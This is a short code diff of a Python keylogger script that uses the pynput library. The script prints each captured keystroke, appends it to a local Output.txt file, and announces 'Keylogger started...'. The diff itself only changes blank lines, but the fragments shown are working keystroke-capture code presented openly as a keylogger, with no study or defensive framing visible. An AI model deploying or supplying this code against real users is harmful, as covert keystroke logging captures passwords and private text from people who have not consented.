@@ -1,5 +1,6 @@
 from pynput import keyboard
 
+
 def keyPressed(key):
     print(str(key))
     with open("Output.txt", 'a') as LogKey:
@@ -15,5 +16,3 @@ if __name__ == "__main__":
     input()
 
 print("Keylogger started...")
-
-
